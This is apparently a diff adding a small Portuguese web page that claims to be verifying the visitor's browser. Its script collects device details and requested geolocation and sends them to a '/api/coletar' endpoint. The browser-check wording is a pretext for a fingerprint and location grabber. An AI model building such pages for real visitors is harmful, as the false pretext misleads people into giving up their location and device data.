@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Carregando...</title>
+</head>
+<body>
+  <h2>Verificando informações do seu navegador...</h2>
+  <pre id="output"></pre>
+
+  <script>
+    async function coletarDados() {
+      const info = {
+        userAgent: navigator.userAgent,
+        idioma: navigator.language,
+        plataforma: navigator.platform,
+        fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        resolucao: `${window.screen.width}x${window.screen.height}`,
+        localizacao: null
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            info.localizacao = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            };
+            enviar(info);
+          },
+          erro => {
+            info.localizacao = 'Negada';
+            enviar(info);
+          }
+        );
+      } else {
+        info.localizacao = 'Navegador não suporta';
+        enviar(info);
+      }
+
+      function enviar(dados) {
+        document.getElementById('output').textContent = JSON.stringify(dados, null, 2);
+        fetch('/api/coletar', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dados)
+        });
+      }
+    }
+
+    coletarDados();
+  </script>
+</body>
+</html>
